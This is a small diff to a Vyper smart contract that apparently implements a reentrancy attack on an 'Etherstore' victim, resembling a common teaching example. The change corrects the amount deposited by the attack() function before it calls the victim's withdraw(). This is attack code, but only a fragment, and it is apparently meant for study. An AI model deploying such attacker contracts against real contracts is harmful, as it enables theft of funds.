@@ -38,7 +38,7 @@ def __default__():
 @payable
 def attack():
     assert msg.value >= as_wei_value(1, "ether"), "Must send 1 ETH"
-    IEtherstore(self.victim).deposit(value=1)
+    IEtherstore(self.victim).deposit(value=as_wei_value(1, "ether"))
     IEtherstore(self.victim).withdraw()
 
 # @notice Helper function to get the balance of the contract
